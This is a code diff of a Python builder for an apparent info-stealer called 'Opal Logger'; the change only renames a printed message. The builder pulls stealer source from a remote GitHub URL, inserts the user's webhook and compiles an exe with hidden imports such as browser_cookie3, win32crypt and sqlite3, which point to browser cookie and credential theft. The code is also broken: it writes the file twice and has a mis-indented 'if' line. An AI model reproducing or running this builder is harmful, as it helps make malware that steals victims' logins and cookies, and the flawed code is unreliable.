@@ -26,7 +26,7 @@ code = requests.get("https://raw.githubusercontent.com/Syntheticc/Opal-Logger/ma
 with open(f"{name}.py", 'w', encoding='utf8') as f:
     f.write(code.text.replace("webhooker", webhook))
     f.write(code.text.replace("lollll", name))
-Write.Print("Rawr Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
+Write.Print("Opal Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
 compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
     if compile == "y":
         os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
